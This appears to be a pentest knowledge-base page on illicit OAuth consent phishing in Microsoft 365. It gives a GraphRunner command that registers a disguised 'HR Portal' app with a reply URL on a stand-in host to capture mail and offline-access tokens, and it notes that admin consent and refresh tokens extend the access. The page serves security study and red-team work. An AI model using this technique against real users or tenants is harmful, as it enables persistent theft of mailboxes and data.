---
title: "Consent phishing: the illicit consent grant"
order: 2
description: "Illicit consent grant attacks: luring users or admins into consenting to a malicious OAuth app that captures Graph-scoped tokens and mailbox access."
keywords:
  - consent phishing
  - illicit consent grant
  - OAuth app
  - Graph scopes
  - delegated permissions
---

# Consent phishing

Instead of stealing a password, you register an OAuth app requesting Microsoft Graph **delegated scopes** (mail, files, offline access) and send the victim a legitimate `login.microsoftonline.com` consent link. When they consent, the app receives tokens for those scopes, giving durable access to their mailbox and data with no credential and no MFA prompt afterward.

## Build and deliver the grant

```powershell
# GraphRunner: stand up a malicious app and generate the consent URL
Invoke-InjectOAuthApp -AppName "HR Portal" -ReplyUrl https://you.example/auth -Scope "Mail.Read offline_access"
# send the resulting https://login.microsoftonline.com/common/adminconsent?... or /authorize link
```

## Exploitation notes

- The consent page is genuine Microsoft UI, which is what makes the lure effective; the user grants your app, not a credential.
- Admin consent to an app role grants tenant-wide application permissions, a far larger prize than a single user's delegated scopes.
- The app's refresh token persists access across password changes until the grant is revoked.

## Tools

- **GraphRunner** (`Invoke-InjectOAuthApp`): app injection and consent URL.
- **365-Stealer** / **o365-attack-toolkit**: consent-phishing frameworks.

## References

- [GraphRunner (dafthack)](https://github.com/dafthack/GraphRunner)
- [HackTricks Cloud: consent phishing](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
- [dirkjanm.io: illicit consent](https://dirkjanm.io/)
